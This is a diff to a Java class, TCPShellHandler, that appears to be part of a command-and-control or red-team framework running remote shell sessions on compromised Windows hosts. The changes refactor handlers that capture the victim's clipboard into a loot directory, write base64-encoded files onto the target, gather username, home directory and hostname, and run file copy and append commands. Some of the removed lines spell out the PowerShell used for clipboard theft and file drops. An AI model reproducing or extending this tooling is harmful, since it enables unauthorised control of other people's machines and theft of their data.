@@ -236,10 +236,21 @@ public class TCPShellHandler implements Runnable {
 	private static boolean isACatReadCmd(String cmd) {
 		return !cmd.contains("<") && !cmd.contains(">");
 	}
+	
+	public static boolean isCatACopyCmd(String cmd) {
+		String[] elements = cmd.split(" ");
+		if(elements.length == 4 && elements[2].equals(">")) {
+			return true;
+		}else {
+			return false;
+		}
+	}
 
 	private void operateWindowsCommand(OutputStreamWriter bw, String nextCommand) throws IOException {
 		if(nextCommand.equalsIgnoreCase("die")) {
-			OutputStreamWriterHelper.writeAndSend(bw, "exit");
+			OutputStreamWriterHelper.writeAndSend(bw, "exit" + System.lineSeparator());
+			//For unknown reasons sometimes the first exit is not acted upon
+			OutputStreamWriterHelper.writeAndSend(bw, "exit" + System.lineSeparator());
 		}else if(nextCommand.equalsIgnoreCase(Commands.CLIENT_CMD_OS_HERITAGE)) {
 			StringBuilder sb = new StringBuilder();
 			sb.append(Commands.OS_HERITAGE_RESPONSE_WINDOWS);
@@ -249,13 +260,7 @@ public class TCPShellHandler implements Runnable {
 			StringBuilder sb = new StringBuilder();
 			sb.append("Username: " + username);
 			sb.append(System.lineSeparator());
-			bw.write("echo %USERPROFILE%");
-			bw.write(System.lineSeparator());
-			bw.flush();
-			String response = lsr.readUnknownLinesFromSocketWithTimeout(1000);
-
-			String lines[] = response.split(System.lineSeparator());
-			sb.append("Home Directory: " + lines[0]);
+			sb.append("Home Directory: " + lsr.getUserDirectory(bw, sessionId));
 			sb.append(System.lineSeparator());
 			sb.append("Hostname: " + hostname);
 			sb.append(System.lineSeparator());
@@ -270,24 +275,16 @@ public class TCPShellHandler implements Runnable {
 			bw.write(System.lineSeparator());
 			bw.flush();
 		} else if (nextCommand.equalsIgnoreCase("clipboard")) {
-			String clipCommand = "powershell -command \"Get-Clipboard\"";
-			bw.write(clipCommand);
-			// System.out.println(clipCommand);
-			bw.write(System.lineSeparator());
-			bw.flush();
-			// System.out.println("Reading...");
-			String response = lsr.readUnknownLinesFromSocketWithTimeout(1000);
-			// System.out.println("res: " + response);
-
 			String baseDir = lz + File.separator + hostname + username;
 			Files.createDirectories(Paths.get(baseDir));
 			String filename = "Clipboard" + HTTPSManager.ISO8601_WIN.format(new Date()) + ".txt";
 
 			try (FileWriter stream = new FileWriter(baseDir + File.separator + filename)) {
-				stream.write(response.toString());
+				stream.write(lsr.getClipboard(bw, sessionId).toString());
 			}
 			// System.out.println("File written: " + baseDir + File.separator + filename);
 			ioManager.sendIO(sessionId, "Clipboard captured" + System.lineSeparator());
+			
 		} else if (nextCommand.startsWith(UPLINK_CMD)) {
 			String targetFilename = nextCommand.substring(UPLINK_CMD.length());
 			try {
@@ -310,21 +307,19 @@ public class TCPShellHandler implements Runnable {
 						filename += args[idx];
 					}
 				}
-				String downloadCommand = "powershell -c \"[IO.File]::WriteAllBytes('" + filename
-						+ "', [Convert]::FromBase64String('" + args[args.length - 1] + "'))\"";
-				// System.out.println(downloadCommand);
-				bw.write(downloadCommand);
-				bw.write(System.lineSeparator());
-				bw.flush();
-				String msg = lsr.readUnknownLinesFromSocketWithTimeout(1000);
-				if (msg.contains("Exception calling \"FromBase64String\"")) {
-					String toClientMsg = "Invalid download directive" + System.lineSeparator();
-					ioManager.sendIO(sessionId, toClientMsg);
-				} else {
-					String toClientMsg = "File written: " + filename + System.lineSeparator();
-					ioManager.sendIO(sessionId, toClientMsg);
+				try {
+					Base64.getDecoder().decode(args[args.length - 1]);
+					String msg = lsr.downloadBase64File(filename, args[args.length - 1], bw, sessionId);
+					if (msg.contains("Exception calling \"FromBase64String\"")) {
+						String toClientMsg = "Invalid download directive" + System.lineSeparator();
+						ioManager.sendIO(sessionId, toClientMsg);
+					} else {
+						String toClientMsg = "File written: " + filename + System.lineSeparator();
+						ioManager.sendIO(sessionId, toClientMsg);
+					}
+				}catch(IllegalArgumentException ex) {
+					ioManager.sendIO(sessionId, "Invalid download directive" + System.lineSeparator());
 				}
-
 			}
 		}else if(nextCommand.equals(Commands.CLIENT_CMD_HARVEST_CURRENT_DIRECTORY)) {
 			String pwd = lsr.getPwd(bw, sessionId);
@@ -343,8 +338,12 @@ public class TCPShellHandler implements Runnable {
 				ioManager.sendIO(sessionId, response);
 			} else if (nextCommand.charAt(CAT_CMD.length()) == '>') {
 				processCatBuildWrite(nextCommand, bw, OS.WINDOWS);
+			}else if(isCatACopyCmd(nextCommand)) {
+				ioManager.sendIO(sessionId, lsr.executeCatCopyCommand(bw, sessionId, nextCommand) + System.lineSeparator());
 			} else {
 				// Append file to file
+				ioManager.sendIO(sessionId, lsr.executeCatAppendCommand(bw, sessionId, nextCommand) + System.lineSeparator());
+				/*
 				// Overwrite file to file
 				// Simply replaces cat with type
 				String modCommand = nextCommand.replace(CAT_CMD, "type ");
@@ -358,7 +357,7 @@ public class TCPShellHandler implements Runnable {
 				} else { // When > for file write
 					ioManager.sendIO(sessionId, "File write executed" + System.lineSeparator());
 				}
-
+*/
 			}
 			// screenshot - Cannot current implement with command prompt or powershell w/out
 			// disk top
